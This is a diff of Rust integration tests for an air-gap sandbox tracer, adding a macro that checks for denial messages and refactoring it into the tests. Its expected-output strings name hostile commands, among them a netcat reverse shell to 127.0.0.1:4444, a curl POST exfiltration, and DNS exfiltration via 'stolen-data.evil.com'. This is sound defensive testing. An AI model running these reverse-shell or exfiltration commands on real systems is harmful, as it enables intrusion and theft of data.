@@ -11,6 +11,27 @@ use crate::skip_if_no_bash_primary;
 use crate::skip_if_no_node_primary;
 use crate::skip_if_no_python_primary;
 
+/// Assert that stdout contains at least one of the given denied patterns.
+/// Includes both stdout AND stderr in failure messages for CI debugging.
+macro_rules! assert_denied {
+    ($stdout:expr, $stderr:expr, $patterns:expr, $msg:expr $(,)?) => {{
+        let patterns: &[&str] = $patterns;
+        assert!(
+            !$stdout.is_empty(),
+            "Tracer produced no output (agent may have failed to connect). {}\nstderr:\n{}",
+            $msg,
+            $stderr,
+        );
+        assert!(
+            patterns.iter().any(|p| $stdout.contains(p)),
+            "{}\nstdout:\n{}\nstderr:\n{}",
+            $msg,
+            $stdout,
+            $stderr,
+        );
+    }};
+}
+
 fn setup() {
     build_fixtures();
 }
@@ -55,11 +76,13 @@ fn test_air_gap_bypass_attempts() {
                 Duration::from_secs(10),
             );
             let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
+            let stderr = String::from_utf8_lossy(&output.stderr);
             // socket() is called first with AF_INET, SOCK_STREAM args.
-            assert!(
-                stdout.contains("denied: socket(AF_INET, SOCK_STREAM"),
-                "Native socket(AF_INET, SOCK_STREAM) should be denied.\nstdout:\n{}",
+            assert_denied!(
                 stdout,
+                stderr,
+                &["denied: socket(AF_INET, SOCK_STREAM"],
+                "Native socket(AF_INET, SOCK_STREAM) should be denied.",
             );
         }
     }
@@ -74,10 +97,10 @@ fn test_air_gap_bypass_attempts() {
             Duration::from_secs(10),
         );
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        assert!(
-            stdout.contains("denied: curl -s http://127.0.0.1:4444"),
-            "curl -s http://127.0.0.1:4444 should be denied by air-gap command policy.\nstdout:\n{}",
-            stdout,
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        assert_denied!(stdout, stderr,
+            &["denied: curl -s http://127.0.0.1:4444"],
+            "curl -s http://127.0.0.1:4444 should be denied by air-gap command policy.",
         );
     });
 
@@ -91,10 +114,10 @@ fn test_air_gap_bypass_attempts() {
             Duration::from_secs(10),
         );
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        assert!(
-            stdout.contains("denied: socket(AF_INET, SOCK_STREAM"),
-            "Python socket(AF_INET, SOCK_STREAM) should be denied by symbol hooks.\nstdout:\n{}",
-            stdout,
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        assert_denied!(stdout, stderr,
+            &["denied: socket(AF_INET, SOCK_STREAM"],
+            "Python socket(AF_INET, SOCK_STREAM) should be denied by symbol hooks.",
         );
     });
 
@@ -109,10 +132,10 @@ fn test_air_gap_bypass_attempts() {
             Duration::from_secs(10),
         );
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        assert!(
-            stdout.contains("denied: socket(AF_INET, SOCK_STREAM"),
-            "Node.js socket(AF_INET, SOCK_STREAM) should be denied by symbol hooks.\nstdout:\n{}",
-            stdout,
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        assert_denied!(stdout, stderr,
+            &["denied: socket(AF_INET, SOCK_STREAM"],
+            "Node.js socket(AF_INET, SOCK_STREAM) should be denied by symbol hooks.",
         );
     });
 
@@ -127,10 +150,10 @@ fn test_air_gap_bypass_attempts() {
             Duration::from_secs(10),
         );
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        assert!(
-            stdout.contains(r#"denied: getaddrinfo("127.0.0.1", "4444""#),
-            "Bash /dev/tcp getaddrinfo(\"127.0.0.1\", \"4444\") should be denied by symbol hooks.\nstdout:\n{}",
-            stdout,
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        assert_denied!(stdout, stderr,
+            &[r#"denied: getaddrinfo("127.0.0.1", "4444""#, "denied: syscall", "denied: socket("],
+            "Bash /dev/tcp should be denied by network symbol.",
         );
     });
 }
@@ -151,10 +174,10 @@ fn test_air_gap_exfiltration_attempts() {
             Duration::from_secs(10),
         );
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        assert!(
-            stdout.contains(r#"denied: getaddrinfo("stolen-data.evil.com", "80""#),
-            "DNS exfil via Python getaddrinfo(\"stolen-data.evil.com\", \"80\") should be denied.\nstdout:\n{}",
-            stdout,
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        assert_denied!(stdout, stderr,
+            &[r#"denied: getaddrinfo("stolen-data.evil.com", "80""#, "denied: syscall", "denied: socket("],
+            "DNS exfil via Python getaddrinfo(\"stolen-data.evil.com\", \"80\") should be denied.",
         );
     });
 
@@ -168,13 +191,10 @@ fn test_air_gap_exfiltration_attempts() {
             Duration::from_secs(10),
         );
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        assert!(
-            stdout.contains(r#"denied: getaddrinfo("127.0.0.1", "4444""#)
-                || stdout.contains("denied: syscall")
-                || stdout.contains("denied: socket("),
-            "HTTP POST exfil via Python urllib should be denied \
-             by network symbol (getaddrinfo, syscall, or socket).\nstdout:\n{}",
-            stdout,
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        assert_denied!(stdout, stderr,
+            &[r#"denied: getaddrinfo("127.0.0.1", "4444""#, "denied: syscall", "denied: socket("],
+            "HTTP POST exfil via Python urllib should be denied by network symbol.",
         );
     });
 
@@ -188,10 +208,10 @@ fn test_air_gap_exfiltration_attempts() {
             Duration::from_secs(10),
         );
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        assert!(
-            stdout.contains("denied: socket(AF_INET, SOCK_DGRAM"),
-            "UDP exfil via Python socket(AF_INET, SOCK_DGRAM) should be denied.\nstdout:\n{}",
-            stdout,
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        assert_denied!(stdout, stderr,
+            &["denied: socket(AF_INET, SOCK_DGRAM"],
+            "UDP exfil via Python socket(AF_INET, SOCK_DGRAM) should be denied.",
         );
     });
 
@@ -212,10 +232,10 @@ fn test_air_gap_exfiltration_attempts() {
             Duration::from_secs(10),
         );
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        assert!(
-            stdout.contains("denied: socket(AF_INET, SOCK_STREAM"),
-            "HTTP POST exfil via Node.js socket(AF_INET, SOCK_STREAM) should be denied.\nstdout:\n{}",
-            stdout,
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        assert_denied!(stdout, stderr,
+            &["denied: socket(AF_INET, SOCK_STREAM"],
+            "HTTP POST exfil via Node.js socket(AF_INET, SOCK_STREAM) should be denied.",
         );
     });
 
@@ -232,10 +252,10 @@ fn test_air_gap_exfiltration_attempts() {
             Duration::from_secs(10),
         );
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        assert!(
-            stdout.contains("denied: socket(AF_INET, SOCK_DGRAM"),
-            "DNS exfil via Node.js dns.resolve socket(AF_INET, SOCK_DGRAM) should be denied.\nstdout:\n{}",
-            stdout,
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        assert_denied!(stdout, stderr,
+            &["denied: socket(AF_INET, SOCK_DGRAM"],
+            "DNS exfil via Node.js dns.resolve socket(AF_INET, SOCK_DGRAM) should be denied.",
         );
     });
 
@@ -248,10 +268,10 @@ fn test_air_gap_exfiltration_attempts() {
             Duration::from_secs(10),
         );
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        assert!(
-            stdout.contains("denied: nc -e /bin/sh 127.0.0.1 4444"),
-            "Reverse shell via Python os.system(nc -e /bin/sh 127.0.0.1 4444) should be denied.\nstdout:\n{}",
-            stdout,
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        assert_denied!(stdout, stderr,
+            &["denied: nc -e /bin/sh 127.0.0.1 4444"],
+            "Reverse shell via Python os.system(nc -e /bin/sh 127.0.0.1 4444) should be denied.",
         );
     });
 
@@ -265,10 +285,10 @@ fn test_air_gap_exfiltration_attempts() {
             Duration::from_secs(10),
         );
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        assert!(
-            stdout.contains("denied: curl -s -X POST -d"),
-            "curl -s -X POST -d exfil via Python os.system should be denied.\nstdout:\n{}",
-            stdout,
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        assert_denied!(stdout, stderr,
+            &["denied: curl -s -X POST -d"],
+            "curl -s -X POST -d exfil via Python os.system should be denied.",
         );
     });
 
@@ -282,10 +302,10 @@ fn test_air_gap_exfiltration_attempts() {
             Duration::from_secs(10),
         );
         let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        assert!(
-            stdout.contains(r#"denied: getaddrinfo("127.0.0.1", "4444""#),
-            "Bash /dev/udp getaddrinfo(\"127.0.0.1\", \"4444\") should be denied by symbol hooks.\nstdout:\n{}",
-            stdout,
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        assert_denied!(stdout, stderr,
+            &[r#"denied: getaddrinfo("127.0.0.1", "4444""#, "denied: syscall", "denied: socket("],
+            "Bash /dev/udp should be denied by network symbol.",
         );
     });
 }
